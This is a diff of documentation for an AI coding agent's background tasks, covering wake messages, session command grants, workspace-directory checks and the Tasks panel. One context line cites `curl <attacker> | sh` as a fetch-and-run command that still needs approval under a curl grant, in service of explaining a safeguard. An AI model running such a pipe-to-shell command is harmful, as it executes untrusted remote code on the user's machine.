@@ -44,7 +44,7 @@ Every process that runs turns attaches one waker to its task pool, under one **k
 
 ### What the woken turn looks like
 
-The woken turn starts from a plain statement of the outcome, which is what the model reads: every task with its id, status, label, exit code, runtime and any error, the tool that has the detail (`background_output`), and the reminder that a task which failed, timed out or was stopped did not succeed.
+The woken turn starts from a plain statement of the outcome, which is what the model reads: every task with its id, status, label, exit code, runtime and any error, the tool that has the detail (`background_output`), and the reminder that a task which failed, timed out or was stopped did not succeed. For a subagent run that did not finish it also names the `spawn_agent` call with `resume` that continues the same child ([Resuming a run](subagents.md#resuming-a-run)).
 
 Nobody typed that message, and no surface shows it as if somebody had. The first message of a woken turn is persisted with a marker - `background_wake` in `messages.json` and in `GET /foxxycode/sessions/{id}/messages`, the tasks with their outcome - and the turn opens with a `background_wake` session update before the message is written, so a client that reloads between the two sees the wake once. As the turn begins, the pool marks its tasks as having woken the agent (`woke_agent` on the task row, kept in the task's record).
 
@@ -207,6 +207,8 @@ Widening is offered **only** for a single plain invocation. Anything carrying sh
 
 Grants are session-scoped (`internal/session.State.PermissionCommandGrants`). Matching is deliberately stricter than for the operator-authored `tools.command_allowlist`: a session grant only ever covers a candidate command that is itself a single plain invocation. Trailing arguments stay covered, as they always were, but appending shell machinery does not — `curl <attacker> | sh` asks again even with a `curl` grant. The operator's own `tools.command_allowlist` keeps its documented prefix meaning.
 
+A grant approves a command, not the directory it runs in. A `run_command` whose `cwd` leaves the workspace (an absolute path elsewhere, or a relative one that climbs out with `..`) asks again even when its command is granted or allowlisted, and the prompt names that directory. Under `bypass` nothing asks, as before.
+
 ## HTTP surface
 
 | Method | Path | Purpose |
@@ -225,6 +227,7 @@ The panel is **docked inside the session**, to the right of the transcript, at `
 
 - **Every task is the same card**, whatever it is and whether it runs or has finished: a status dot, a **tag** that says what stands behind it (`shell` for a command, the agent's name for a subagent run, `memory` for the memory run of a turn, `server` for a preview server), the title - the command, or what the agent was asked to do - and a line under it: elapsed against the estimate while it runs, how long it ran and when it ended afterwards (`20s · 12:50`). How the task ended is the dot's colour; the card says it in words only when opened. A subagent run, a scheduled run and the memory run also name, on the right of that line, the model they run on and the tokens their calls have spent (`qwen3.8-27b · 212k tokens`), updated while they run; hovering the card shows the full model id and the input and output tokens apart. A running card adds a Stop control, a **bell** after the title when the task will wake the agent when it ends (hover: *Wakes the agent when it ends*) and, **only** when the model supplied an estimate, a progress bar; a finished card keeps the bell when its end did wake the agent (hover: *Woke the agent when it ended*). Running tasks stand at the top of the panel under no heading; anything above the **Finished N** counter is running.
 - **A click anywhere on a card opens it in place.** There is no second pane: the open card shows the command with a copy button (neither an agent run nor a preview server has a shell behind it, and nothing is shown there), the error if the run ended with one (not the bare `exit status 2` of a command, which only repeats the exit code), the captured output in a box that scrolls on its own, and at the bottom how the task ended and its exit code (`Failed · Exit code 2`; an agent run and a preview server have no process behind them, so theirs names the outcome alone). How long it ran, and the way into the task - **Show transcript** for a subagent run, the address of a preview server - stay on the card's own line, where they are read whether the card is open or not. Open as many cards as you like: each keeps reading its own output while its task runs. Which cards are open is not part of the address, which says only that the panel is showing.
+- **On a desktop-wide window the panel follows the chat.** Open it, then pick other chats in History: the panel stays open and shows the tasks of each chat picked, and clicking past History to dismiss it leaves the panel open. On a tablet or a phone the panel is full screen, and opening History closes it, as before.
 - **Finished N** is a counter, not a list. Expanding it shows the finished cards; the rest stay on disk. That is how "keep every log" and "do not load the app" hold at once: the list is counted, the cards render on demand, and a task's output is fetched only when its card is opened.
 - **Clear** drops the finished history for this session (`DELETE /foxxycode/sessions/{id}/background-tasks`). Running tasks are untouched.
 - Ordering is **purely by start time**, newest first, among the live cards and inside the finished history alike. Running tasks are not floated to the top of the history: they stand above the counter already, and mixing two orderings makes a list that never sits still to read.
@@ -233,7 +236,7 @@ The panel is **docked inside the session**, to the right of the transcript, at `
 ![The Tasks panel opened from the control in the chat header: two running cards, and a finished command opened in place](../assets/background-tasks-header-opener-dark-1280.png)
 
 *The Tasks panel opened from the control in the chat header: a subagent and a command still running, and a finished build opened in place with its command, output and exit code*
-- A transcript tool row that started a task names itself a background run and shows the task's clock where an ordinary row shows its duration, plus **Open in Tasks** and **Stop** when expanded. It says nothing about how the run ended: the status, the estimate, the exit code and the error are read on the task's card in the panel, which is what **Open in Tasks** opens: the panel comes up with that card already open.
+- A transcript tool row that started a task names itself a background run and shows the task's clock where an ordinary row shows its duration. It says nothing about how the run ended: the status, the estimate, the exit code and the error are read on the task's card in the panel, which the **Tasks** control in the chat header opens.
 
 - A turn the agent was woken into shows nothing of its own, neither a user bubble nor a note: the answer follows the previous turn, and the bell on the task's card says what woke the agent ([Waking the agent](#what-the-woken-turn-looks-like)).
 
@@ -275,7 +278,7 @@ It is also the one kind of task with no hard limit. A page the operator asked to
 
 ## System tasks
 
-A task the runtime starts on its own behalf, today the memory subagent of a user turn ([Long-term memory](memory.md)), is a `kind: agent` task whose `agent` object carries `system: true`. It is admitted past `tools.background.max_concurrent` and never counted toward it, because that cap bounds the work the model starts and a run per turn would refuse the model's next command; the model-facing tools (`background_list`, `background_output`, `background_wait`, `background_stop`) omit it and refuse its id, while the REST rows and the Tasks drawer show it, its card tagged `memory`. Drain stops it like any task, after a grace for a run that is still persisting.
+A task the runtime starts on its own behalf, today the memory subagent of a user turn ([Long-term memory](memory.md)), is a `kind: agent` task whose `agent` object carries `system: true`. It is admitted past `tools.background.max_concurrent` and never counted toward it, because that cap bounds the work the model starts and a run per turn would refuse the model's next command; the model-facing tools (`background_list`, `background_output`, `background_wait`, `background_stop`) omit it and refuse its id, while the REST rows and the Tasks panel show it, its card tagged `memory`. Drain stops it like any task, after a grace for a run that is still persisting.
 
 ## Subagent runs
 
